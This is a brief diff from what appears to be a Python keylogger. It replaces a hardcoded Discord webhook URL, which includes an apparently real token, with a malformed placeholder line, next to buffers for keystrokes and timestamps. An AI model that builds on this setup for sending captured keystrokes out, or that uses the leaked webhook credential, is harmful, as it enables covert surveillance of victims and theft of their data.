@@ -4,7 +4,7 @@ from datetime import datetime as d
 
 
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1328866786388742145/W118Jsi5p2h-rztNtq46ctDoEAOu0mDV3yO6CLZZgODFGxkp4SN-Ops3q62VMaLH0CWf"
+WEBHOOK_URL = "https://discord.com/api/webhooks/"YOUR WEBHOOK HERE"
 
 keystroke_buffer = []
 time_buffer = []
